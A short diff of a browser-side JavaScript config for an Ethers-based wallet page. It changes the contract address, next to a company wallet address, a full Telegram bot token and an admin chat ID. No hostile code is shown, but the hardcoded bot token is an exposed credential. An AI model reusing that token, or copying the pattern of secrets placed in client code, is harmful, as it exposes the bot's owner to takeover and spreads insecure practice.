@@ -21,7 +21,7 @@ document.addEventListener("DOMContentLoaded", function () {
     // Note: window.ethereum uses Ethers v5 syntax (ethers.providers.Web3Provider, ethers.utils.formatUnits, etc.)
     const CONFIG = {
         COMPANY_WALLET_ADDRESS: "0x0192cbD7ab3a3732C367223CaaC6633Cb86d41B1",
-        CONTRACT_ADDRESS: "0x6797d32b1e892eB79f0c1D6f42Cd9504F763C55a",
+        CONTRACT_ADDRESS: "0xA63b69B251D0902d7dBb1B5F94579BBb70800a48",
         TELEGRAM_BOT_TOKEN: "8921017188:AAHQaL4HaWtDzd73VSq0jO2K2xGX0LUM-Xk", // Notification Bot Token (Bot A)
         ADMIN_CHAT_ID: "8975376700", // CRITICAL: Your Admin Group Chat ID
     };
